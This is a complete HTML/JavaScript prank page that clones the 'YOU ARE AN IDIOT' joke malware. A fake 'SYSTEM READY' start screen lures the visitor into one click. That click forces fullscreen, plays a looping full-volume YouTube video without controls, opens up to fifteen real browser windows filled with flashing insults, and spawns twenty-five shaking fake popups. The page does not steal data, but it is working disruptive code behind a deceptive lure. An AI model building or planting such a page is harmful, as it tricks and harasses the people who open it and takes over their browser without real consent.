<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }

        /* ===== Стартовый экран ===== */
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: radial-gradient(circle at center, #111 0%, #000 100%);
            z-index: 99999;
            transition: opacity 0.6s;
        }
        #start-screen.fade-out { opacity: 0; pointer-events: none; }
        #start-screen h1 {
            font-size: 28px; color: #fff;
            margin: 0 0 12px; letter-spacing: 2px;
        }
        #start-screen p {
            font-size: 15px; color: #888;
            margin: 0 0 40px; text-align: center;
            max-width: 420px; line-height: 1.5;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 22px 60px; font-size: 22px;
            border-radius: 10px; cursor: pointer;
            font-weight: bold; letter-spacing: 1px;
            box-shadow: 0 0 30px rgba(0, 204, 68, 0.7);
            transition: transform 0.15s, box-shadow 0.3s;
            animation: pulse 1.6s infinite;
        }
        #green-btn:hover { background: #00ff55; transform: scale(1.06); }
        #green-btn:active { transform: scale(0.96); }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 30px rgba(0, 204, 68, 0.7); }
            50% { box-shadow: 0 0 55px rgba(0, 255, 85, 1); }
        }

        /* ===== Контейнер YouTube ===== */
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
            overflow: hidden;
        }
        #yt-player {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }

        /* ===== ФЕЙКОВЫЕ ОКНА ===== */
        .fake-popup {
            position: fixed;
            width: 420px;
            background: #000;
            border: 3px solid red;
            color: red;
            font-family: monospace;
            text-align: center;
            z-index: 10000;
            box-shadow: 0 0 25px rgba(255,0,0,0.9);
            animation: shake 0.15s infinite;
            user-select: none;
        }
        .fake-popup .popup-title {
            background: red;
            color: white;
            padding: 5px 10px;
            font-size: 12px;
            text-align: left;
            cursor: move;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: bold;
        }
        .fake-popup .popup-close {
            background: black;
            color: red;
            border: none;
            cursor: pointer;
            font-weight: bold;
            padding: 0 8px;
            font-size: 14px;
        }
        .fake-popup .popup-body { padding: 25px 10px; }
        .fake-popup h1 {
            font-size: 38px;
            margin: 0;
            animation: blink 0.4s infinite;
            line-height: 1.1;
        }
        .fake-popup p { margin: 12px 0 0; font-size: 14px; }
        @keyframes blink {
            0% { color: red; }
            50% { color: black; }
            100% { color: red; }
        }
        @keyframes shake {
            0% { transform: translate(0,0); }
            25% { transform: translate(2px,2px); }
            50% { transform: translate(-2px,-2px); }
            75% { transform: translate(2px,-2px); }
            100% { transform: translate(0,0); }
        }
    </style>
</head>
<body>

    <div id="start-screen">
        <h1>⚙ SYSTEM READY</h1>
        <p>Один клик — и всё разрешено:<br>видео, звук, всплывающие окна и полный экран</p>
        <button id="green-btn" onclick="startEverything()">▶ Начать</button>
    </div>

    <div id="video-container">
        <div id="yt-player"></div>
    </div>

    <script>
        // ============================================================
        //  YouTube IFrame API
        // ============================================================
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        document.head.appendChild(tag);

        var VIDEO_ID = 'hPZxDJYmTUw';
        var ytPlayer = null;
        var ytReady = false;

        var started = false;
        var openedWindows = [];
        var MAX_WINDOWS = 15;
        var fakePopupsCount = 0;
        var MAX_FAKE = 25;

        function onYouTubeIframeAPIReady() {
            ytPlayer = new YT.Player('yt-player', {
                height: '100%',
                width: '100%',
                videoId: VIDEO_ID,
                playerVars: {
                    autoplay: 0,
                    controls: 0,
                    loop: 1,
                    playlist: VIDEO_ID,
                    modestbranding: 1,
                    rel: 0,
                    fs: 0,
                    iv_load_policy: 3
                },
                events: {
                    'onReady': function(event) {
                        ytReady = true;
                        console.log('YouTube плеер готов');
                        fitYouTubeToScreen();
                        if (started) {
                            event.target.setVolume(100);
                            event.target.unMute();
                            event.target.playVideo();
                        }
                    },
                    'onStateChange': function(event) {
                        if (event.data === YT.PlayerState.ENDED) {
                            ytPlayer.seekTo(0);
                            ytPlayer.playVideo();
                        }
                    }
                }
            });
        }

        function fitYouTubeToScreen() {
            var container = document.getElementById('video-container');
            var w = container.clientWidth;
            var h = container.clientHeight;
            var videoAspect = 16 / 9;
            var screenAspect = w / h;
            var iframe = document.getElementById('yt-player');
            if (!iframe) return;

            if (screenAspect > videoAspect) {
                iframe.style.width = w + 'px';
                iframe.style.height = (w / videoAspect) + 'px';
            } else {
                iframe.style.height = h + 'px';
                iframe.style.width = (h * videoAspect) + 'px';
            }
        }
        window.addEventListener('resize', fitYouTubeToScreen);

        // ============================================================
        //  СТАРТ — ОДИН КЛИК
        // ============================================================
        function startEverything() {
            if (started) return;
            started = true;

            // 1. ВИДЕО + ЗВУК
            document.getElementById('video-container').style.display = 'block';
            fitYouTubeToScreen();

            if (ytReady && ytPlayer) {
                ytPlayer.setVolume(100);
                ytPlayer.unMute();
                ytPlayer.playVideo();
            } else {
                console.log('Ждём готовности плеера...');
            }

            // 2. FULLSCREEN
            try {
                var el = document.documentElement;
                if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            } catch(e) {}

            // 3. ОТКРЫВАЕМ РЕАЛЬНЫЕ ОКНА
            for (var i = 0; i < MAX_WINDOWS; i++) {
                try {
                    var w = window.open('', '_blank', 'width=500,height=400');
                    if (w && !w.closed) {
                        w.document.write(`
                            <html><head><title>Loading...</title></head>
                            <body style="background:#000;color:#0f0;font-family:monospace;
                                         display:flex;align-items:center;justify-content:center;
                                         height:100vh;margin:0;">
                                <h2>Загрузка... #${i+1}</h2>
                            </body></html>
                        `);
                        openedWindows.push(w);
                    }
                } catch(e) { break; }
            }

            console.log('Реальных окон открыто:', openedWindows.length);

            // 4. Скрываем стартовый экран
            var ss = document.getElementById('start-screen');
            ss.classList.add('fade-out');
            setTimeout(function() { ss.style.display = 'none'; }, 600);

            // 5. ЧЕРЕЗ 1 СЕКУНДУ — ХАОС
            setTimeout(startChaos, 1000);
        }

        // ============================================================
        //  ХАОС
        // ============================================================
        function startChaos() {
            // A) Реальные окна → вирус
            var realTimer = setInterval(function() {
                if (openedWindows.length === 0) {
                    clearInterval(realTimer);
                    return;
                }
                var w = openedWindows.shift();
                if (w && !w.closed) fillVirusWindow(w, fakePopupsCount);
            }, 400);

            // B) Фейковые окна
            var spawnFake = setInterval(function() {
                if (fakePopupsCount >= MAX_FAKE) {
                    clearInterval(spawnFake);
                    return;
                }
                fakePopupsCount++;
                createFakePopup(fakePopupsCount);
            }, 350);
        }

        function fillVirusWindow(w, index) {
            if (!w || w.closed) return;
            try {
                w.document.open();
                w.document.write(`
                    <html>
                    <head><title>YOU ARE AN IDIOT</title></head>
                    <body style="background:black;color:red;font-family:monospace;
                                 text-align:center;padding-top:60px;overflow:hidden;margin:0;">
                        <h1 style="font-size:70px;animation:blink 0.4s infinite;margin:0;">
                            YOU ARE AN IDIOT
                        </h1>
                        <h2 style="font-size:32px;margin-top:20px;">SURVIVAL FOR THE FITTEST</h2>
                        <button onclick="window.close()" style="font-size:20px;
                                padding:15px 30px;margin-top:40px;
                                background:red;color:white;border:none;
                                cursor:pointer;">CLOSE ME</button>
                        <style>
                            @keyframes blink {
                                0% { color: red; }
                                50% { color: black; }
                                100% { color: red; }
                            }
                            body { animation: shake 0.1s infinite; }
                            @keyframes shake {
                                0% { transform: translate(0,0); }
                                25% { transform: translate(3px,3px); }
                                50% { transform: translate(-3px,-3px); }
                                75% { transform: translate(3px,-3px); }
                                100% { transform: translate(0,0); }
                            }
                        </style>
                    </body>
                    </html>
                `);
                w.document.close();
            } catch(e) {}
        }

        function createFakePopup(index) {
            var popup = document.createElement('div');
            popup.className = 'fake-popup';

            var maxX = Math.max(0, window.innerWidth - 440);
            var maxY = Math.max(0, window.innerHeight - 260);
            popup.style.left = Math.floor(Math.random() * maxX) + 'px';
            popup.style.top = Math.floor(Math.random() * maxY) + 'px';

            popup.innerHTML = `
                <div class="popup-title">
                    <span>⚠ YOU ARE AN IDIOT #${index}</span>
                    <button class="popup-close" title="Закрыть">✕</button>
                </div>
                <div class="popup-body">
                    <h1>YOU ARE AN IDIOT</h1>
                    <p>SURVIVAL FOR THE FITTEST</p>
                </div>
            `;
            document.body.appendChild(popup);

            popup.querySelector('.popup-close').addEventListener('click', function(e) {
                e.stopPropagation();
                popup.remove();
            });

            var titleBar = popup.querySelector('.popup-title');
            var dragging = false, offsetX = 0, offsetY = 0;

            titleBar.addEventListener('mousedown', function(e) {
                dragging = true;
                offsetX = e.clientX - popup.offsetLeft;
                offsetY = e.clientY - popup.offsetTop;
                popup.style.animation = 'none';
                e.preventDefault();
            });

            document.addEventListener('mousemove', function(e) {
                if (!dragging) return;
                popup.style.left = (e.clientX - offsetX) + 'px';
                popup.style.top = (e.clientY - offsetY) + 'px';
            });

            document.addEventListener('mouseup', function() {
                if (dragging) {
                    dragging = false;
                    popup.style.animation = 'shake 0.15s infinite';
                }
            });
        }
    </script>
</body>
</html>
